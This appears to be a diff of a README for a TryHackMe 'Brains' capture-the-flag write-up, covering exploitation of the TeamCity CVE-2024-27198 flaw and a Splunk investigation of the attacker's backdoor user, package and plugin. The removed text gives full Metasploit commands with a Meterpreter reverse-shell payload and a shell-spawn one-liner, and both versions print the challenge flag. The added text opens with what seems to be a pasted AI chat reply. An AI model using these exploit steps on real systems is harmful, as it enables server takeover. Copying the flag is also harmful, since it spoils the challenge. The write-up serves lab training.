@@ -1,261 +1,166 @@
-````md
-# TryHackMe - Brains Writeup 🧠🔍
+Got it — you want your README to match that clean **CTF-style format**. Here’s your **Brains write-up converted into that exact style** 👇
 
-![Category](https://img.shields.io/badge/Category-web)
-![Difficulty](https://img.shields.io/badge/Difficulty-easy)
-![Tools](https://img.shields.io/badge/Tools-Metasploit%20%7C%20splunk%20%7C%20python3-lightgrey)
+---
+
+# 🧠 CTF Challenge: Brains – TeamCity Exploitation & Log Analysis 🔥
+
+![Category](https://img.shields.io/badge/Category-Web_Exploitation_&_SOC-blue)
+![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green)
+![Tools](https://img.shields.io/badge/Tools-Metasploit%20%7C%20Nmap%20%7C%20Splunk-lightgrey)
 
 ---
 
 ## 📖 Scenario Overview
 
-The **Brains** room on TryHackMe simulates a real-world compromise involving a vulnerable CI/CD infrastructure.  
-The target server is running **JetBrains TeamCity**, which contains a critical authentication bypass vulnerability that can lead to Remote Code Execution (RCE).
+An engineering server running a CI/CD pipeline was compromised due to a critical vulnerability in a TeamCity instance.
 
-After gaining access to the machine, the challenge shifts into a **Blue Team investigation**, where Splunk is used to trace attacker activity, persistence mechanisms, and malicious artifacts left behind.
+An attacker exploited the system, gained remote access, and established persistence within the server environment.
+
+From a defensive standpoint, system logs were collected to investigate the attacker’s activities and determine how the breach occurred.
+
+**Target IP:** `10.48.181.158`
+**Service:** TeamCity (Port 50000)
 
 ---
 
-## 🎯 Objectives
+## 🎯 Objective
 
-### 🔴 Red Team
-- Enumerate the target machine
-- Identify vulnerable services
-- Exploit TeamCity RCE vulnerability
-- Gain shell access and capture the flag
-
-### 🔵 Blue Team
-- Investigate attacker persistence
-- Identify malicious package installations
-- Analyze TeamCity activity logs
-- Discover uploaded malicious plugins
+* Exploit the vulnerable TeamCity server
+* Gain remote access to the machine
+* Capture the user flag
+* Investigate logs to uncover attacker actions
+* Identify persistence mechanisms and malicious artifacts
 
 ---
 
 ## 🛠️ Tools Used
 
-* **Nmap** — Service enumeration and port scanning  
-* **Metasploit Framework** — Exploiting CVE-2024-27198  
-* **Linux CLI** — Post-exploitation enumeration  
-* **Splunk** — Log analysis and threat hunting  
+* **Nmap** – Service discovery and enumeration
+* **Metasploit Framework** – Exploitation (RCE)
+* **Splunk** – Log analysis and threat investigation
+* **Linux CLI** – Post-exploitation and enumeration
 
 ---
 
 ## 📂 Repository Contents
 
-* `challenge` - TryHackMe - https://tryhackme.com/room/brains  
-* `writeup.md` - Full technical walkthrough  
-* `README.md` - Project overview  
+* `challenge` – TryHackMe room: Brains
+* `writeup.md` – Full step-by-step technical walkthrough
+* `README.md` – This file
 
 ---
 
-# 🚀 Solution Summary
+## 🚀 Solution Summary
 
-## 🔴 Phase 1 — Reconnaissance
+### 🔴 Red Team (Exploitation Phase)
 
-Performed a full Nmap scan:
+1. **Reconnaissance**
 
-```bash
-nmap -sC -sV -p- -v <TARGET_IP>
-````
+   * Performed full port scan using Nmap
+   * Identified:
 
-### Discovered Services
+     * SSH (22)
+     * HTTP (80)
+     * TeamCity (50000)
 
-| Port  | Service | Version  |
-| ----- | ------- | -------- |
-| 22    | SSH     | OpenSSH  |
-| 80    | HTTP    | Apache   |
-| 50000 | HTTP    | TeamCity |
+2. **Enumeration**
 
-Port `50000` exposed a **JetBrains TeamCity** instance.
+   * Accessed TeamCity web interface
+   * Version identified: `2023.11.3`
+   * Found vulnerability:
+     ➤ CVE-2024-27198
 
----
+3. **Exploitation**
 
-## 🔴 Phase 2 — Vulnerability Identification
+   * Used Metasploit module:
 
-The TeamCity login portal revealed:
+     ```
+     exploit/multi/http/jetbrains_teamcity_rce_cve_2024_27198
+     ```
+   * Payload:
 
-```text
-TeamCity 2023.11.3
-```
+     ```
+     java/meterpreter/reverse_tcp
+     ```
+   * Successfully gained reverse shell
 
-Research identified the target as vulnerable to:
+4. **Post-Exploitation**
 
-## CVE-2024-27198
+   * Spawned interactive shell
+   * Retrieved flag:
 
-* Authentication Bypass
-* Remote Code Execution
-* Unauthenticated access to TeamCity REST API
-
----
-
-## 🔴 Phase 3 — Exploitation
-
-Used Metasploit to exploit the vulnerability:
-
-```bash
-use exploit/multi/http/jetbrains_teamcity_rce_cve_2024_27198
-```
-
-### Payload Configuration
-
-```bash
-set RHOSTS <TARGET_IP>
-set RPORT 50000
-set payload java/meterpreter/reverse_tcp
-set LHOST <YOUR_IP>
-set LPORT 4444
-exploit
-```
-
-### Result
-
-* Authentication bypass successful
-* Malicious plugin uploaded
-* Meterpreter session established
+     ```
+     THM{faa9bac345709b6620a6200b484c7594}
+     ```
 
 ---
 
-## 🔴 Phase 4 — Post Exploitation
+### 🔵 Blue Team (Investigation Phase)
 
-Spawned an interactive shell:
+1. **Backdoor User Detection**
 
-```bash
-python3 -c 'import pty;pty.spawn("/bin/bash")'
+   * Splunk query:
+
+     ```
+     index=* sourcetype=auth_logs "new user"
+     ```
+   * Found attacker-created account:
+     ➤ `eviluser`
+
+2. **Malware / Package Analysis**
+
+   * Query:
+
+     ```
+     index=* ("apt install" OR "dpkg -i")
+     ```
+   * Detected suspicious installations:
+
+     * `gcc`
+   * Malicious package identified:
+     ➤ `datacollector`
+
+3. **Malicious Plugin Discovery**
+
+   * Query:
+
+     ```
+     index=* sourcetype=teamcity_activities "plugin"
+     ```
+   * Found uploaded exploit payload:
+     ➤ `AyzzbuXY.zip`
+
+---
+
+## 🧠 Key Learnings
+
+* CI/CD tools like TeamCity are high-value targets
+* Authentication bypass vulnerabilities can lead to full system compromise
+* Attackers often:
+
+  * Create backdoor users
+  * Install malicious packages
+  * Upload custom payloads/plugins
+* Log analysis is critical for incident response and threat hunting
+
+---
+
+## 🚩 Flag
+
+<details>
+  <summary>Click to reveal flag</summary>
+
 ```
-
-Retrieved the flag:
-
-```bash
-cat flag.txt
-```
-
-### 🚩 Flag
-
-```text
 THM{faa9bac345709b6620a6200b484c7594}
 ```
 
----
-
-# 🔵 Blue Team Investigation
-
-After compromise, Splunk was used to investigate attacker actions.
+</details>
 
 ---
 
-## Investigation 1 — Backdoor User Creation
+## ⚠️ Disclaimer
 
-### Splunk Query
-
-```spl
-index=* sourcetype=auth_logs "new user"
-```
-
-### Findings
-
-Identified a suspicious user created by the attacker.
-
-### Answer
-
-```text
-eviluser
-```
+This project is for **educational purposes only**.
+All activities were performed in a controlled lab environment on TryHackMe.
 
 ---
-
-## Investigation 2 — Malicious Package Installation
-
-### Splunk Query
-
-```spl
-index=* ("apt install" OR "dpkg -i")
-```
-
-### Findings
-
-Detected suspicious package installations including:
-
-* gcc
-* apache2
-* java-common
-* net-tools
-
-A malicious Debian package was also discovered:
-
-```text
-datacollector
-```
-
-### Answer
-
-```text
-datacollector
-```
-
----
-
-## Investigation 3 — Malicious Plugin Upload
-
-### Splunk Query
-
-```spl
-index=* sourcetype=teamcity_activities "plugin"
-```
-
-### Findings
-
-TeamCity logs revealed the uploaded malicious plugin archive.
-
-### Answer
-
-```text
-AyzzbuXY.zip
-```
-
----
-
-# 📚 Key Takeaways
-
-## 🔴 Red Team
-
-* Importance of service enumeration
-* Exploiting vulnerable CI/CD platforms
-* Understanding TeamCity RCE attacks
-* Proper payload selection for Java applications
-
-## 🔵 Blue Team
-
-* Detecting persistence through auth logs
-* Monitoring package installations
-* Hunting malicious TeamCity activity
-* Using Splunk for forensic investigations
-
----
-
-# ⚠️ Security Lessons
-
-This room demonstrates how dangerous unpatched CI/CD environments can be.
-
-The vulnerability **CVE-2024-27198** allows attackers to:
-
-* Bypass authentication
-* Upload malicious plugins
-* Execute arbitrary code
-* Fully compromise the server
-
-Proper patch management, logging, and monitoring are essential for defending CI/CD infrastructure.
-
----
-
-# 👨‍💻 Author
-
-**Khairul Azim**
-
-* GitHub: [https://github.com/AzimSource](https://github.com/AzimSource)
-* Portfolio: [https://azimsource.github.io/azim-portfolio/](https://azimsource.github.io/azim-portfolio/)
-
----
-
-```
-```
